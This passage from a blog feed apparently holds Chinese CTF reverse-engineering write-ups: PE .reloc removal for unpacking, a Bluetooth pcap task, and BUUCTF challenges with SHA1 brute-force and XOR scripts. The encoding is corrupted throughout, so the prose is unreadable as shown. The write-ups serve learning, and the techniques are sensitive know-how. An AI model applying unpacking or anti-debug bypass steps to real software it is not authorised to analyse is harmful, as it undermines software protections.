æˆ‘ä»¬åœ¨è„±å£³ä¹‹å‰è¿˜æ˜¯å…ˆå…³é—­å®ƒæœ€å¥½,ä¹Ÿæ–¹ä¾¿è°ƒè¯•æ—¶IDAä¸ODä¸­åœ°å€çš„å¯¹åº”(å¦‚æœåªæ˜¯æƒ³åœ°å€å¯¹åº”, ä¹Ÿå¯ä»¥åœ¨IDAä¸­å¯åŠ¨æ—¶æŠŠManual loadå‹¾ä¸Š, æ‰‹åŠ¨è¾“å…¥åŠ è½½çš„åŸºåœ°å€å³å¯),  æ—¢ç„¶å…³é—­äº†ASLR, é‚£å¤šå‡ºçš„.relocèŠ‚ä¹Ÿå°±æ²¡ç”¨äº†, ä¸‹é¢æ‰‹åŠ¨åˆ é™¤è¯¥èŠ‚åŒº(è™½ç„¶æœ‰å¾ˆå¤šå·¥å…·å¯ä»¥ç›´æ¥å®ç°, è¿˜æ˜¯æ‰‹åŠ¨ç†Ÿæ‚‰ä¸‹PEç»“æ„)</strong></p></blockquote><h2 id="åˆ é™¤-relocèŠ‚åŒº"><a href="#åˆ é™¤-relocèŠ‚åŒº" class="headerlink" title="åˆ é™¤.relocèŠ‚åŒº"></a>åˆ é™¤.relocèŠ‚åŒº</h2><p>é¦–å…ˆæ¯ä¸ªèŠ‚éƒ½å¯¹åº”ä¸€ä¸ªèŠ‚åŒºå¤´çš„, é‚£å…ˆä»èŠ‚åŒºå¤´å¼€å§‹. ä½¿ç”¨010editorå¯ä»¥è½»æ¾åœ¨æœ€åä¸€èŠ‚åŒºå¤´æ‰¾åˆ°.  æˆ‘ä»¬å°†å…¶å…¨éƒ¨ç”¨0è¦†ç›–å¡«å……å³å¯.(æ³¨: ä¸èƒ½ç›´æ¥åˆ é™¤äº†, ä¸ç„¶PEæ–‡ä»¶çš„å¾ˆå¤šå±æ€§ä¼šå¯¹åº”ä¸ä¸Š)<img src="/2020/05/12/ASLR/image-20200511205903649-1589256958060.png" alt="image-20200511205903649"></p><p>ä¸‹é¢åˆ é™¤.relocæ•´ä¸ªèŠ‚åŒº(ä¸€èˆ¬è¿™ä¸ªèŠ‚åŒºéƒ½æ˜¯æ–°åŠ çš„,æ‰€ä»¥åœ¨æœ€å, æˆ‘ä»¬åªè¦æ‰¾åˆ°åç§»åœ°å€ç›´æ¥åˆ é™¤åˆ°æœ€åå³å¯), å¦‚å›¾, ç›´æ¥åˆ é™¤åˆ°æœ€åå³å¯. (è¿™é‡Œçš„Size: 600h, ä¸‹é¢æœ‰ç”¨)<img src="/2020/05/12/ASLR/image-20200511210742225-1589256958060.png" alt="image-20200511210742225"></p><p>åˆ é™¤å®Œå, æˆ‘ä»¬çŸ¥é“PEæ–‡ä»¶å¤´çš„<strong>_IMAGE_FILE_HEADER</strong>çš„<strong>NumberOfSections</strong>çš„å€¼ä¸€å®šè¦ä¸¥æ ¼çš„ä¸å®é™…èŠ‚åŒºå¯¹åº”, æ‰€ä»¥å»ä¿®æ”¹ <strong>_IMAGE_FILE_HEADER</strong>çš„<strong>NumberOfSections</strong>ä½¿å…¶å‡ä¸€.<img src="/2020/05/12/ASLR/image-20200511210943674-1589256958060.png" alt="image-20200511210943674">)<img src="/2020/05/12/ASLR/image-20200511211434269-1589256958060.png" alt="image-20200511211434269"></p><p>æœ€åè¿˜æœ‰ä¿®æ”¹ä¸€ä¸ªå±æ€§, å°±æ˜¯PEæ–‡ä»¶å¤´ <strong>_IMAGE_OPTIONAL_HEADER</strong></p><p>çš„<strong>SizeOfImage</strong>, ä¿®æ”¹ä¸ºå‡å» .relocèŠ‚åŒºåçš„å¤§å°  ä»ä¸Šé¢æˆ‘ä»¬çŸ¥é“.relocå¤§å°æ˜¯600h, è€Œè¯¥PEæ–‡ä»¶<strong>SectionAlignment(èŠ‚åœ¨å†…å­˜ä¸­çš„æœ€å°å•ä½ (å¯¹é½å•ä½) ä¸€èˆ¬ä¸º: 1000h)ä¸º1000h</strong>, 1000h &gt; 600h. ä»¥1000hå¯¹é½, æ‰€ä»¥æˆ‘ä»¬ç›´æ¥å°†<strong>SizeOfImage</strong>å‡å»1000hå³å¯.<img src="/2020/05/12/ASLR/image-20200511211537176-1589256958060.png" alt="image-20200511211537176">)<img src="/2020/05/12/ASLR/image-20200511212159056-1589256958060.png" alt="image-20200511212159056"></p><blockquote><p>å¦‚æœæƒ³å¢åŠ ä¸€ä¸ªèŠ‚åŒº, ä¹Ÿå¯ä»¥ä½¿ç”¨åŒæ ·çš„æ–¹æ³•</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> PE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç³»ç»Ÿ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020å¹´DASCTFå››æœˆçº¿ä¸Šèµ›</title>
      <link href="/2020/04/25/2020%E5%B9%B4DASCTF%E5%9B%9B%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
      <url>/2020/04/25/2020%E5%B9%B4DASCTF%E5%9B%9B%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h2 id="Bluetooth"><a href="#Bluetooth" class="headerlink" title="Bluetooth"></a>Bluetooth</h2><p>ä¸‹è½½ä¸‹æ¥æ˜¯ä¸€ä¸ªæµé‡åŒ…, é¢˜ç›®ä¹Ÿæ²¡æœ‰æç¤º, å°±å…ˆç”¨binwalkçœ‹èƒ½ä¸èƒ½æå–å‡ºä»€ä¹ˆ. ç›´æ¥ <strong>binwalk -e</strong>, ä»€ä¹ˆä¹Ÿæ²¡æœ‰, </p><p>ä½†æ˜¯æˆ‘ä»¬å¾€ä¸‹çœ‹ä¸€ä¸‹, æ˜¯æœ‰ä¸ªå‹ç¼©åŒ…. é‚£å°±æ‰‹åŠ¨æå–å§. <strong>dd if=3.pcapng bs=1 skip=24437 of=3.zip</strong> </p><p><img src="/2020/04/25/2020%E5%B9%B4DASCTF%E5%9B%9B%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200425202118617-1590546897888.png" alt="image-20200425202118617"></p><p>è¿™æ¬¡, æ–‡ä»¶æ‰€åœ¨ç›®å½•å‡ºç°äº†ä¸€ä¸ªå‹ç¼©åŒ…, å°è¯•æ‰“å¼€ä½†æ˜¯æœ‰å¯†ç , ä½†æ˜¯æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å®ƒæç¤ºä¿¡æ¯: </p><p><img src="/2020/04/25/2020%E5%B9%B4DASCTF%E5%9B%9B%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200425202435440-1590546907450.png" alt="image-20200425202435440"></p><a id="more"></a><p>è¯´å¯†ç è“ç‰™çš„pin, æˆ‘ä¹Ÿæ˜¯åˆšåˆšæ¥è§¦è¿™ä¸ªwireshareè¿™ä¸ªè½¯ä»¶, ç™¾åº¦äº†ä¸€ä¸‹, å°±æ˜¯æˆ‘ä»¬è¿æ¥è“ç‰™æ—¶çš„é‚£ä¸ªæ•°å­—.  ä½†æ˜¯æˆ‘æ˜¯ä¸çŸ¥é“æ€ä¹ˆæ‰¾è¿™ä¸ªä¸œè¥¿,å°±ç™¾åº¦æ€ä¹ˆç”¨wiresharkæŠ“è“ç‰™çš„åŒ…, ä½†æ²¡æœ‰çš„å¾—åˆ°æœ‰ç”¨æ¶ˆæ¯, æœ‰çš„è¿˜è¦ä»€ä¹ˆè“ç‰™é©±åŠ¨. å°±è‡ªå·±å»æœç´¢bluetooth, æ‰¾äº†ä¸€åœˆä¹Ÿæ²¡æœ‰å¾—åˆ°é‚£ä¸ªpin.  æˆ‘å°±åˆè·‘å»æ‰“æš´åŠ›ç ´è§£çš„æ‰“ç®—, ä½†åˆæ²¡æœ‰7zå‹ç¼©åŒ…æš´åŠ›ç ´è§£å¯†ç çš„å·¥å…·, åˆå»å„å¤§è®ºå›æ‰¾, æ‰¾åˆ°äº†ä½†æ²¡ç”¨ğŸ˜‚. æš‚æ—¶æ”¾ä¸‹äº†è¿™ä¸ªé¢˜, å»åšreverse, reverseçš„2ä¸ªé¢˜åšçš„è¿˜æ¯”è¾ƒé¡ºåˆ©.  å›æ¥ç»§ç»­çœ‹è¿™ä¸ªé¢˜, è¿™æ¬¡å¹²è„†ç›´æ¥æœ pin è¯•è¯•, å‡ºç° PINè¯·æ±‚, PINè¯·æ±‚å›åº”, PINè¯·æ±‚å›åº”å®Œæˆ, </p><p><img src="/2020/04/25/2020%E5%B9%B4DASCTF%E5%9B%9B%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200425203534918-1590546913901.png" alt="image-20200425203534918"></p><p>é‚£ä¹ˆè¿™PINè¯·æ±‚å›åº”çš„å¯èƒ½æ€§å°±æœ€å¤§äº†, ç‚¹è¿›å»:å¯ä»¥çœ‹åˆ° PIN Code : 141854.  </p><p><img src="/2020/04/25/2020%E5%B9%B4DASCTF%E5%9B%9B%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200425203900340-1590546919828.png" alt="image-20200425203900340"></p><p>æœ€åè¾“å…¥å‹ç¼©åŒ…å¾—åˆ°flag.</p><p><img src="/2020/04/25/2020%E5%B9%B4DASCTF%E5%9B%9B%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200425204118569-1590546940841.png" alt="image-20200425204118569"></p><hr><h2 id="reverseç¬¬äºŒé¢˜"><a href="#reverseç¬¬äºŒé¢˜" class="headerlink" title="reverseç¬¬äºŒé¢˜"></a>reverseç¬¬äºŒé¢˜</h2><p>é¢˜ç›®ä¸‹è½½å, ç”¨idaæ‰“å¼€, æ‰¾åˆ°ä¸»å‡½æ•°, é€»è¾‘ä¸Šå¾ˆæ¸…æ™°, è¯´æ˜¯å°†flagä¸æˆ‘ä»¬è¾“å…¥çš„æ•°å­—æ··åˆåœ¨äº†ä¸€èµ·. ç¨‹åºå°±åšäº†å°†æˆ‘ä»¬è¾“å…¥çš„æ•°å­—ä¸å·²ç»ç¼–ç äº†çš„ä¸€äº›æ•°æ®è¿›è¡Œå¼‚æˆ–è¿ç®—ç„¶åè¾“å‡ºçš„æ“ä½œ.</p><p><img src="/2020/04/25/2020%E5%B9%B4DASCTF%E5%9B%9B%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200426191831676-1590546936568.png" alt="image-20200426191831676"></p><p>å¼€å§‹æƒ³çš„æ˜¯ä¼šä¸ä¼šç›´æ¥å°±æ˜¯å·²ç»ç¼–ç çš„æ•°æ®, çœ‹äº†çœ‹ASCII,ä¸å¯èƒ½æ˜¯.  </p><p>é‚£æœ‰å¯èƒ½å°±æ˜¯å°†æˆ‘ä»¬è¾“å…¥çš„æ•°æ®ä¸ç¼–ç çš„æ•°æ®è¿›è¡Œæˆ–è¿ç®—åè¾“å‡ºçš„æ˜¯flag. é‚£ä¹ˆæŒ‰ç…§flagçš„æ ¼å¼, æ ¹æ®é¢˜ç›®è¯´ æœ€åçš„flagè¾“å…¥çš„æ˜¯ flag{}/DACTF{}ä¸­çš„æ•°æ®, é‚£ä¹ˆè¿™é‡Œçš„flagä¹Ÿå°±æ˜¯è¿™2ç§æ ¼å¼äº†. </p><p>è¿™æ ·å°±å¥½åŠäº†, ä»–ä»¬æœ«å°¾éƒ½æ˜¯ <strong>}</strong> æˆ‘ä»¬æŠŠç¼–ç æ•°æ®çš„æœ€åä¸€ä½ 61 , æ‰¾åˆ°ä¸€ä¸ªæ•°å­—ä¸å®ƒå¼‚æˆ–è¿ç®—ä½çš„å€¼ä¸º <strong>}</strong> çš„ASCII 125, å°±è¡Œäº†. å¾—åˆ°64, æœ€åæŠŠç¼–ç çš„æ‰€æœ‰æ•°æ®ä¸<strong>64</strong>è¿›è¡Œä¸€ä¸ªå¼‚æˆ–è¿ç®—å°±å¾—åˆ°flag. </p><p><strong>ä½†æ˜¯æå–æ•°å­—æ—¶,æˆ‘ä»¬å¯ä»¥ç›´æ¥æŠŠä»£ç å¤åˆ¶åˆ°ç¼–è¯‘ä¸­, ä½†æ˜¯æ³¨æ„, è¿™ä¸æ˜¯æ•°ç»„, æ ¹æ®æ ˆçš„ç‰¹ç‚¹, è¦å€’ç€éå†.</strong></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF</title>
      <link href="/2020/04/23/BUUCTF/"/>
      <url>/2020/04/23/BUUCTF/</url>
      
        <content type="html"><![CDATA[<p>BUUåˆ·é¢˜è®°å½•    â€”ä¸å®šæœŸæ›´æ–°ã€‚<a id="more"></a></p><h2 id="CrackRTF"><a href="#CrackRTF" class="headerlink" title="CrackRTF"></a>CrackRTF</h2><p>ä»åˆšå¼€å§‹æ¥è§¦ BUUCTF , åšåˆ°é€†å‘çš„è¿™é“é¢˜, çœ‹äº†writeup ä¹Ÿè§‰å¾—éš¾, å°±åœæ»äº†ä¸€æ®µæ—¶é—´. åˆ°è®ºå‰‘åœºå’Œæ”»é˜²ä¸–ç•Œåšäº†20å¤šå¤©(æœŸé—´ä¹Ÿå¼€å§‹äº†pwn), ä»Šå¤©çªç„¶æƒ³åˆ°è¿™é“é¢˜ã€‚</p><p>å¼€å§‹æ‰“å¼€idaåˆ†ææ—¶, å‘ç°é€»è¾‘æ˜¯å¤šä¹ˆçš„æ¸…æ™°, ä½†æ˜¯å½“è¿›å…¥ç¬¬ä¸€ä¸ªå…³é”®å‡½æ•°æ—¶, æƒ³èµ·äº†ä¸Šæ¬¡çš„éš¾ç‚¹. (1)å¯¹hashå¾ˆé™Œç”Ÿ, ä¸çŸ¥é“ä¸ºä»€ä¹ˆhashä¸å¯é€†, å¿…é¡»è¦çˆ†ç ´. (2)å½“æ—¶ä¸€ç‚¹pythonéƒ½æ²¡æ¥è§¦è¿‡, å¯¹äºè¦å†™pythonè„šæœ¬çˆ†ç ´, å°±è§‰å¾—å¾ˆçƒ¦(å½“ç„¶ç»è¿‡ä¸æ–­çš„å­¦ä¹ , è¿™20å¤šå¤©, æ¥è§¦å¹¶å¼€å§‹å­¦ä¹ äº›python). (3)è¿™é‡Œç¬¬äºŒæ¬¡è¾“å…¥, å› ä¸ºæ²¡æœ‰é™åˆ¶æ¡ä»¶, è¿˜ä¸èƒ½çˆ†ç ´, åé¢åˆæ˜¯ä¸€äº›ä»æ²¡å¬è¯´è¿‡çš„æ“ä½œ.(ä½†å…¶å®è¿™æ¬¡å†æ¥çœ‹, å…¶å®å°±æ˜¯è¦ç”¨<strong>Resource Hacker</strong>è¿™ä¸ªå·¥å…·æŸ¥çœ‹.exeæ–‡ä»¶é‡Œçš„èµ„æºæ–‡ä»¶, ç»è¿‡ä¸€äº›é€»è¾‘ä¸Šçš„æ“ä½œ)ã€‚</p><p>é¦–å…ˆ, çŸ¥é“æ˜¯ç³»ç»Ÿè°ƒç”¨çš„å‡½æ•°, å½“æ—¶å°±æ¯ä¸ªéƒ½ç™¾åº¦äº†ä¸‹, ä¹Ÿæ˜¯å¾ˆéº»çƒ¦çš„(ä½†æ˜¯é€†å‘çš„è·¯å°±æ˜¯è¿™æ ·, è¦çŸ¥é“çš„å¾ˆå¤šå¾ˆå¤š, åªæœ‰è‡ªå·±æ…¢æ…¢çš„ç§¯ç´¯).è®°å¾—æ•´ä¸ªå‡½æ•°ä½œç”¨å°±æ˜¯ è°ƒç”¨ä¸€ä¸ªhashåŠ å¯†å‡½æ•°. å…·ä½“æ˜¯é‚£ä¸ªhash, å¯ä»¥æŸ¥çœ‹å®˜æ–¹çš„ä»‹ç», ä»è¿™é‡Œçš„ç¼–å· : <strong>0x8004</strong> å»æ‰¾å¯¹åº”çš„åŠ å¯†, ç»è¿‡æŸ¥è¯¢æ˜¯ sha1.</p><p><img src="/2020/04/23/BUUCTF/image-20200423194434469.png" alt="image-20200423194434469"></p><p>å› ä¸ºhashä¸å¯é€†, ä½†æ˜¯è¿™é‡Œæœ‰å­—ç¬¦ä¸²é•¿åº¦æ˜¯ 6 ä½, ä¸”è½¬åŒ–ä¸ºæ•´æ•°å &gt;= 100000, é‚£ä¹ˆèŒƒå›´å°±ç¡®å®šäº†: 100000 - 999999, ä¸‹é¢çˆ†ç ´è„šæœ¬: å¾—åˆ° <strong>123321@DBApp</strong>, é‚£ä¹ˆæˆ‘ä»¬è¾“å…¥å°±æ˜¯ ; <strong>123321</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">flag = <span class="string">"@DBApp"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100000</span>, <span class="number">999999</span>):</span><br><span class="line">    s = str(i) + flag</span><br><span class="line">    x = hashlib.sha1(s.encode())</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"6E32D0943418C2C33385BC35A1470250DD8923A9"</span>.lower() == x.hexdigest():</span><br><span class="line">        <span class="keyword">print</span> (str(i) + flag)</span><br></pre></td></tr></table></figure><p> æ¥ä¸‹æ¥, è¾“å…¥ç¬¬äºŒä¸ªå­—ç¬¦ä¸², ä½†æ˜¯è¦åŠ ä¸Šä¸Šé¢çš„<strong>123321@DBApp</strong> ç„¶åhashåŠ å¯†æ“ä½œ.ä½†æ˜¯è¿™æ¬¡çš„ç¼–å·æ”¹å˜äº† <strong>0x8003 : md5</strong>, è¿™æ¬¡æ²¡æœ‰é™åˆ¶æ¡ä»¶, çˆ†ç ´ä¸è¡Œäº†ã€‚</p><p>ç»è¿‡çœ‹å¤§ç¥ä»¬çš„æ“ä½œ, çŸ¥é“äº†å¯ä»¥é€šè¿‡ä¸‹é¢ä¸€ä¸ªå‡½æ•°.è¿™ä¸ªå‡½æ•°å’Œæˆ‘ä»¬çš„fopené‚£äº›æ–‡ä»¶æ“ä½œä¸åŒ. </p><p>è¿™ä¸ª FindResourceAæ˜¯æ‰“å¼€è¿™ä¸ª.exeæ–‡ä»¶ä¸­èµ„æºæ–‡ä»¶çš„æ–‡ä»¶.(è¿™ç‚¹ç¬¬ä¸€æ¬¡çŸ¥é“, è¿˜æœ‰è¿™ç§æ“ä½œ!!!, ç»è¿‡ç™¾åº¦, å‘ç°å¯ä»¥å°†è‡ªå·±çš„èµ„æºæ–‡ä»¶åŠ å…¥.exeæ–‡ä»¶ä¸­), æ‰“å¼€AAAå, å°†é‡Œé¢çš„å†…å®¹ä¸æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦è¿›è¡Œå¼‚æˆ–æ“ä½œ, æœ€åå°†å†…å®¹å†™å…¥æ–°åˆ›å»ºä¸€ä¸ª dbapp.rtf æ–‡ä»¶. è¿™é‡Œå¤§ç¥çš„è¯´æ³•éƒ½æ˜¯, å› ä¸ºæ˜¯å†™è¿›.rtf æ–‡ä»¶é‚£ä¹ˆå¼€å§‹å†™å…¥çš„å¿…ç„¶æ˜¯æ–‡ä»¶å¤´, æˆ‘ä»¬å°±å¯ä»¥éšä¾¿åˆ›å»ºä¸€ä¸ª.rtfæ–‡ä»¶, æŸ¥çœ‹æ–‡ä»¶å¤´å†…å®¹. å¯ä»¥çœ‹åˆ°æ˜¯<strong>{\rtf1</strong>, æ­£å¥½æ˜¯6ä½,æˆ‘ä»¬æœ€åè¾“å…¥çš„ä¹Ÿæ˜¯6ä½, é‚£ä¹ˆæŠŠä»–å’ŒAAAæ–‡ä»¶ä¸­çš„å‰6ä½å¼‚æˆ–ä¸€ä¸‹, å°±å¾—åˆ°æˆ‘ä»¬è¾“å…¥çš„äº†.<br><img src="/2020/04/23/BUUCTF/image-20200423200957999.png" alt="image-20200423200957999"></p><p><img src="/2020/04/23/BUUCTF/image-20200423202735198.png" alt="image-20200423202735198"></p><p><img src="/2020/04/23/BUUCTF/image-20200423202025893.png" alt="image-20200423202025893"></p><p>ä¸‹é¢è„šæœ¬: æœ€åå¾—åˆ° <strong>~!3a@0</strong>, è¾“å…¥ç¨‹åºå, ä¼šåˆ›å»ºä¸€ä¸ª dbapp.rtf æ–‡ä»¶, æ‰“å¼€å³æ˜¯flag.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">0x05</span>, <span class="number">0x7D</span>, <span class="number">0x41</span>, <span class="number">0x15</span>, <span class="number">0x26</span>, <span class="number">0x01</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">rtf = <span class="string">"&#123;\\rtf1"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(rtf)):</span><br><span class="line">    x = ord(rtf[i]) ^ a[i]</span><br><span class="line">    flag += chr(x)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>ä½†å¯¹äºæœ€åçš„ <strong>å› ä¸ºæ˜¯å†™è¿›.rtf æ–‡ä»¶é‚£ä¹ˆå¼€å§‹å†™å…¥çš„å¿…ç„¶æ˜¯æ–‡ä»¶å¤´</strong> æˆ‘æ˜¯æ„Ÿè§‰å¥‡æ€ªçš„, ä»–åˆ›å»ºäº†ä¸€ä¸ªdbapp.rtf æ–‡ä»¶, å†™å…¥çš„ä¸å°±æ˜¯æ–‡ä»¶çš„å†…å®¹å—, ä¸ºä»€ä¹ˆæ–‡ä»¶å¤´éƒ½è¦æˆ‘ä»¬æ¥å†™å…¥ã€‚ã€‚ å› ä¸ºä»¥å‰å­¦ä¹ æ–‡ä»¶æ“ä½œçš„æ—¶å€™éƒ½æ˜¯å¾€.txtæ–‡ä»¶é‡Œå†™å†…å®¹, é‚£ä¸ªæ²¡æœ‰æ–‡ä»¶å¤´è¿™ä¸€è¯´, æ‰€ä»¥å¯ä»¥ä¸€å¼€å§‹å†™è¿›å†…å®¹. å†™å…¥çš„å®è´¨è¿˜æ˜¯å¡«å……äºŒè¿›åˆ¶çš„01. æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬è¦å…ˆå†™ .rtfæ–‡ä»¶å¤´. </p><p><img src="/2020/04/23/BUUCTF/image-20200423204326824.png" alt="image-20200423204326824"></p><p>æœ€å, .rtfæ–‡ä»¶ä¸ docx dox ç±»ä¼¼, <strong><em>\</em>å¯Œæ–‡æœ¬æ ¼å¼\</strong>ï¼ˆ*<em>Rich Text Format*</em>ï¼‰å³*<em>RTFæ ¼å¼*</em>ï¼Œåˆç§°*<em>å¤šæ–‡æœ¬æ ¼å¼*</em>ï¼Œæ˜¯ç”±<a href="https://baike.baidu.com/item/å¾®è½¯" target="_blank" rel="noopener">å¾®è½¯</a>å…¬å¸å¼€å‘çš„è·¨å¹³å°<a href="https://baike.baidu.com/item/æ–‡æ¡£" target="_blank" rel="noopener">æ–‡æ¡£</a>æ ¼å¼ã€‚å¤§å¤šæ•°çš„<a href="https://baike.baidu.com/item/æ–‡å­—å¤„ç†" target="_blank" rel="noopener">æ–‡å­—å¤„ç†</a>è½¯ä»¶éƒ½èƒ½è¯»å–å’Œä¿å­˜RTFæ–‡æ¡£ã€‚**</p><p>macå…ˆåˆ›å»ºçš„æ–‡æœ¬æ–‡ä»¶, é»˜è®¤éƒ½æ˜¯ .rtf.</p><p>å¿ƒå¾—: å¦‚æœåšåˆ°æ„Ÿè§‰å¾ˆåƒåŠ›çš„é¢˜å¯ä»¥å…ˆæ”¾ä¸€æ”¾, ç­‰å­¦ä¹ ä¸€æ®µæ—¶é—´, çŸ¥è¯†ç§¯ç´¯çš„æ›´å¤šäº†å†æ¥çœ‹, ä¸è¦æ­»ç£•å§ã€‚ã€‚</p><p>å½“ä¸€æ¡è·¯ä¸åŒæ—¶, æ³¨æ„å…¶ä»–å‡½æ•°çš„åŠŸèƒ½, æƒ³å®ƒçš„å­˜åœ¨ä¸ºä»€ä¹ˆã€‚</p><h2 id="Youngter-drive1"><a href="#Youngter-drive1" class="headerlink" title="Youngter-drive1"></a>Youngter-drive1</h2><p>è¿™ä¸ªé¢˜æ‹¿åˆ°æ²¡æ³¨æ„ï¼Œç®€å•çš„æµç¨‹é€»è¾‘ã€‚ã€‚ç„¶åç›´æ¥å†™è„šæœ¬é€†ã€‚ã€‚ä½†ä¸€ç›´æäº¤ä¸å¯¹ã€‚ã€‚çº³é—·äº†ã€‚ã€‚ä¹Ÿæ˜¯æƒ³åŠå¤©ã€‚ã€‚</p><p>è¿™ä¹Ÿæ˜¯è¿™ä¸ªé¢˜çš„å‘ã€‚ã€‚é¢˜ç›®å¼€å¯äº†åŒçº¿ç¨‹ï¼Œä½¿ç¨‹åºä¸­çš„ä¸€ä¸ªåŠ å¯†æ˜¯äº¤æ›¿è¿›è¡Œçš„ã€‚ã€‚å…¶å®å¼€å§‹æˆ‘ä¹Ÿæ³¨æ„åˆ°äº†è¿™é‡Œï¼Œä½†æ²¡å¤šæƒ³ã€‚ã€‚å¯èƒ½åšé¢˜åšç´¯äº†ï¼ˆã€‚ã€‚<img src="/2020/04/23/BUUCTF/image-20200927210802047.png" alt="image-20200927210802047"></p><p>è¿›å…¥ç¬¬ä¸€ä¸ªçœ‹çœ‹ï¼šè¿˜ä¸“é—¨ç”¨äº†ä¸ªSleep()å‡½æ•°ã€‚<img src="/2020/04/23/BUUCTF/image-20200927210932709.png" alt="image-20200927210932709"></p><p>ç§¯ç´¯ä¸‹ï¼Œæ„Ÿè§‰æœ‰ç‚¹å·§å¦™ã€‚</p><h2 id="2019çº¢å¸½æ¯-easyRE"><a href="#2019çº¢å¸½æ¯-easyRE" class="headerlink" title="[2019çº¢å¸½æ¯]easyRE"></a>[2019çº¢å¸½æ¯]easyRE</h2><p>é¢˜ç›®çš„å…³é”®flagæ•°æ®éšè—äº†èµ·æ¥ï¼Œä½†æ˜¯å¯ä»¥çŒœåˆ°çš„ï¼Œå› ä¸ºä»å­—ç¬¦ä¸²æ˜æ˜¾çœ‹åˆ°ä¸€ä¸²æ•°æ®æ²¡æœ‰ä½¿ç”¨ã€‚</p><p>å½“æ­£å¸¸çš„æ€è·¯å‡ºé”™æ—¶å°±åº”è¯¥æƒ³åˆ°ä¹‹å‰å‘ç°çš„å¯ç–‘æ•°æ®äº†ã€‚</p><p>è€Œè¿™ä¸ªé¢˜ä»åŒºæ®µçš„æ ‡è¯†ä¹Ÿæœ‰æç¤º:<img src="/2020/04/23/BUUCTF/image-20200928184132749.png" alt="image-20200928184132749"></p><h2 id="BJDCTF2020-easy1"><a href="#BJDCTF2020-easy1" class="headerlink" title="[BJDCTF2020]easy1"></a>[BJDCTF2020]easy1</h2><p>æ„Ÿè§‰æœ‰ç‚¹æ„æ€ã€‚ã€‚å“ˆã€‚ã€‚</p><p>ç¨‹åºæ‰“å¼€å°±æç¤ºã€‚ã€‚<strong>Can you find me?</strong></p><p>ç„¶åæ‹–è¿›idaçœ‹äº†ä¸€åœˆï¼Œåˆ†æäº†ä¸‹å›è°ƒå‡½æ•°å’Œ_onexit()æ³¨å†Œçš„åœ¨mainå‡½æ•°ç»“æŸåæ‰§è¡Œçš„å‡½æ•°ã€‚æ²¡æœ‰å¯ç–‘çš„åœ°æ–¹ã€‚ã€‚</p><p>æœ€åå‘ç°å¿½ç•¥äº†ç¨‹åºä¸­çš„ä¸€ä¸ª<strong>_ques()</strong>å‡½æ•°ï¼šè™½ç„¶æ²¡æœ‰åœ¨ç¨‹åºä¸­è°ƒç”¨ï¼Œä½†å‘æ§åˆ¶å°æ‰“å°å­—ç¬¦å°±å¾ˆå¯ç–‘ã€‚ã€‚ã€‚<img src="/2020/04/23/BUUCTF/image-20200930210053107.png" alt="image-20200930210053107"></p><p>ç›´æ¥åœ¨ODä¸­æ”¹eipï¼Œç„¶åæ‰§è¡Œè¿™ä¸ªå‡½æ•°ã€‚getã€‚ã€‚<img src="/2020/04/23/BUUCTF/image-20200930210255401.png" alt="image-20200930210255401"></p><h2 id="crackMe1"><a href="#crackMe1" class="headerlink" title="crackMe1"></a>crackMe1</h2><p>ä¸ªäººè®¤ä¸ºè¿™ä¸ªé¢˜æœ‰é—®é¢˜ã€‚ã€‚ã€‚ä¸”è§£æ˜¯å¤šè§£ï¼Œè€Œé¢˜ç›®æ²¡æœ‰è¯´æ˜å’Œé™åˆ¶ã€‚ã€‚</p><p>è€ƒäº†ä¸€äº›åè°ƒè¯•ï¼ŒæŒ‰ç…§å¸¸ç†æ¥è¯´ç¨‹åºåº”è¯¥åœ¨éè°ƒè¯•çŠ¶æ€ä¸‹å¾—å‡ºçš„ç»“æœæ‰ç®—æ­£ç¡®ï¼Œè€Œè¿™ä¸ªé¢˜çš„ä¸€ä¸ªæ¡ä»¶è¦åœ¨è°ƒè¯•çŠ¶æ€ä¸‹ç®—å‡ºçš„æ‰ç®—æ­£ç¡®ã€‚ã€‚</p><p>è¿™é‡Œå°±æ˜¯è¦ä½¿ç”¨è°ƒè¯•çŠ¶æ€ä¸‹è¿›å…¥çš„é‚£ä¸ªåˆ†æ”¯ï¼Œæ‰ç®—æ­£ç¡®ã€‚å³ä¸å¯¹æˆ‘ä»¬ä¼ å…¥çš„æ•°æ®è¿›è¡Œæ”¹å˜ã€‚<img src="/2020/04/23/BUUCTF/image-20201002152338221.png" alt="image-20201002152338221"></p><p>ç„¶ååœ¨å¯¹å¯†ç 